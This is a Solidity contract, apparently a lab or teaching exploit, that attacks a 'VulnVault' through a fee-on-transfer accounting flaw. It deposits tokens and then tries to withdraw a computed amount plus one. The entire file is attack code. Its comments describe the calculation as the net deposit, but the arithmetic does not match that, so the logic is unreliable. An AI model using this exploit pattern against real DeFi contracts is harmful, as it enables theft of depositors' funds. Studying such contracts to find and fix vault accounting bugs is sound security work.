// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./fee-on-transfer.sol";

contract MaliciousFeeToknenExploiter {
    VulnVault public vulnVault;
    IERC20 public token;

    constructor(address _vulnVaultAddress, address _tokenAddress) {
        vulnVault = VulnVault(_vulnVaultAddress);
        token = IERC20(_tokenAddress);
    }

    function exploit(uint256 amount) external {
        // Approve and deposit tokens to the vulnerable contract
        token.approve(address(vulnVault), amount);
        
        // Capture token balance before the deposit
        uint256 balanceBefore = token.balanceOf(address(this));

        // Deposit tokens, where a 1% fee should apply
        vulnVault.deposit(amount);

        // Calculate the actual amount deducted due to transfer fee
        uint256 actualDepositAmount = amount - (balanceBefore - token.balanceOf(address(this)));

        // Exploit by attempting to withdraw more tokens than deposited due to fee miscalculation
        vulnVault.withdraw(actualDepositAmount + 1);
    }
}